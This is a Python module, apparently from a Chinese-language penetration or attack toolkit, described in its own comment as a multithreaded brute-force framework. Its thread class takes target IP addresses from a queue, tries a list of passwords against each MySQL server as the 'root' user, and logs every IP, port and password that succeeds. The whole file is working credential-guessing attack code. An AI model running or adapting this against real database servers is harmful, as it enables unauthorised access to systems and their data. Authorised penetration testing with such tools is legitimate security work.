#-*- coding:utf-8 -*-
# 多线程爆破框架
from Libs.glo import *
import threading
import MySQLdb
import time
from MySQLdb import OperationalError, DatabaseError


logger = get_value('logger')
pyVersion = get_value('pyVersion')
serviceAdmin = get_value('serviceAdmin')
brustPortDic = get_value('brustPortDic')

class brustPortMultiThr(threading.Thread):
    def __init__(self, q_brustIp, event):
        threading.Thread.__init__(self)
        self.q_brustIp = q_brustIp
        self.event = event


    def run(self):
        while self.event.is_set():
            if self.q_brustIp.empty():
                break
            else:
                brust_ip = self.q_brustIp.get()
                port = list(brustPortDic[brust_ip].keys())[0]
                pwds = get_value(brustPortDic[brust_ip][port])
                for pwd in pwds:
                    try:
                        MySQLdb.connect(host=brust_ip, user='root', passwd=pwd, port=int(port), connect_timeout=5)
                        logger.info('[+] IP:[{}] PORT:[{}] USER:[{}] PWD:[{}] Success！'.format(brust_ip, port, 'root', pwd))
                        break

                    except OperationalError as e:
                        args = e.args
                        if args[0] != 1045:
                            logger.info('[-] IP:[{}] PORT:[{}] error:[{}] Fail!'.format(brust_ip, port, args))
                            break
                        #logger.info('IP:[{}] PORT:[{}] USER:[{}] PWD:[{}] Fail！'.format(self.brust_ip, self.port, 'root', pwd))
                    except Exception as e:
                        print('@@@@@@@@@@@{}'.format(e))
